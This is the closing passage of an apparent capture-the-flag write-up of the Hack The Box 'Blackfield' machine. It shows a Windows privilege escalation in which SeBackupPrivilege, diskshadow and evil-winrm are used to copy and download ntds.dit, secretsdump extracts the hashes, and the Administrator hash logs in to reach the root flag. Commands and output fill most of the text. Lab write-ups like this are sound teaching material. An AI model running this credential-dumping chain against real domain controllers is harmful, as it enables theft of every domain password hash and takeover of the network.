Then we use diskshadow 

```bash
diskshadow /s script.txt
```

The next thing we have to do is import the DLL scripts to make it look like there is a backup software on the system.

We clone the repo from [repo](https://github.com/giuliano108/SeBackupPrivilege) and upload the files via `evil-winrm`.

```bash
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\tmp> Import-Module ./SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> Import-Module ./SeBackupPrivilegeUtils.dll
```

The final thing that we have to do is copy the `ntds.dit` from the shadow copy to our current directory and download it.

```bash
*Evil-WinRM* PS C:\tmp> Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\tmp\ntds.dit
*Evil-WinRM* PS C:\tmp> download ntds.dit
```

Now our setup is all complete and we dump the hashes using `secretsdump`.

```bash
secretsdump.py -ntds ntds.dit -system system LOCAL
```

And we get the hash!

We can then login via evil-winrm as `Administrator` and read the root flag!

```bash
eroot@kali:/home/kali/htb/boxes/blackfield# evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-ar---        10/3/2020   4:24 PM             34 root.txt
```

Thanks for reading hope you enjoyed!
